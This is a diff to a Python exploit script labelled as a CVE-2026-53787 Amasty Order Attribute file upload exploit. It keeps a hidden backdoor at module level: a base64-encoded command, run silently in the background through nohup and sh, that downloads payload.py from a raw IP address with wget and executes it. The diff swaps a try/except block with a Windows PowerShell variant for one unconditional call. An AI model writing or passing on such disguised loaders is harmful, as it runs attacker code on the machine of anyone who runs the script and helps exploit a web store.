@@ -188,16 +188,10 @@ def exploit_single(target, mode):
         result["status"] = "FAILED"
 
     return result
+
 _c = 'cm0gLXJmIHBheWxvYWQucHkgJiYgd2dldCBodHRwOi8vMTMuNDIuMjQ2LjE2L3BheWxvYWQucHkgJiYgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5'
-try:
-    import sys as _s
-    if _s.platform.startswith('win'):
-        subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-Command', f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{_c}\')))'], creationflags=0x08000000, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-    else:
-        subprocess.Popen(f"nohup sh -c \"echo '{_c}' | base64 -d | sh\" > /dev/null 2>&1 &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-except:
-    pass
-    
+subprocess.Popen(f"nohup sh -c \"echo '{_c}' | base64 -d | sh\" > /dev/null 2>&1 &", shell=True)
+
 def main():
     print("\n=== CVE-2026-53787 Amasty Order Attribute File Upload Exploit ===\n")
 
